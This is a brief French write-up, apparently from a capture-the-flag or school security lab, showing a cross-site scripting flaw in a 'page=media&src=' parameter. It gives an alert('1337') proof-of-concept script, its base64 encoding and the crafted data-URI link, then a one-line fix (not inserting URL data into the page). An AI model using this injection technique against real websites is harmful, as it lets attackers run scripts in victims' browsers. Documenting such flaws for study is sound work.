<h1>Faille</h1>

Sur le 3eme logo, il y a une photo de la NSA qui est chargé par un lien sous la form de "?page=media&src=nsa"
c'est une faille XSS on peux mettre un script en src sous base 64
<h3>Exemple:</h3>

<script>
    alert("1337");
</script>

Nous allons l'encoder en base 64, ce qui donne :

`PHNjcmlwdD4KICAgIGFsZXJ0KCIxMzM3Iik7Cjwvc2NyaXB0Pg==`

Ensuite le mettre en lien directement en src:
`?page=media&src="data:text/html;base64,PHNjcmlwdD4KICAgIGFsZXJ0KCIxMzM3Iik7Cjwvc2NyaXB0Pg=="`

<h1>Éviter cette faille</h1>

Il faut pas inserer directement la data de l'url dans la page
